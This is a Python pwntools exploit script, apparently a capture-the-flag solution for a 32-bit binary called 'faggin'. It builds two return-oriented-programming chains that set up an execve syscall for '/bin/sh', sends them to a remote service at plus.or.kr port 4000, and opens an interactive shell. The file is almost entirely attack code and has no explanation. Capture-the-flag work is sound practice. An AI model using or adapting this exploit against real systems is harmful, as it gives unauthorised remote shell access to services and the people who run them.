from pwn import *

f = open('./41414141')
offset = 0x1f0 + 4
data = f.read()
f.close()

payload = data[:offset]
bin_addr = 0x080f49bc

rop_chain = p32(0x0804ab60)
rop_chain += p32(0x080489ec)
rop_chain += p32(0x0)
rop_chain += p32(0x080f4800)
rop_chain += p32(0x400)
rop_chain += p32(0x080beda6)
rop_chain += p32(0x080f493c)

payload += rop_chain
payload += data[offset + 28:]

rop_chain_2 = '\x41' * 0x100
rop_chain_2 += p32(0x080725d1)
rop_chain_2 += p32(bin_addr + 0x20)
rop_chain_2 += p32(bin_addr)
rop_chain_2 += p32(0x080edde9)
rop_chain_2 += p32(0x0)
rop_chain_2 += p32(0x080bedf6)
rop_chain_2 += p32(11)
rop_chain_2 += p32(0x080d9f23)
rop_chain_2 += '\x90' * (0x180 - len(rop_chain_2))
rop_chain_2 += '/bin/sh'
rop_chain_2 += '\x00' * (0x1a0 - len(rop_chain_2))
rop_chain_2 += p32(bin_addr)
rop_chain_2 += '\x00' * (0x400 - len(rop_chain_2))

# p = remote('faggin_4f17fb81148f7c476f9b4fa2230ac11e.quals.shallweplayaga.me', 4004)
# p = process(('strace', './faggin'))
# p = process('./faggin')
p = remote('plus.or.kr', 4000)
p.send(payload)
p.send(rop_chain_2)

p.interactive()
p.close()
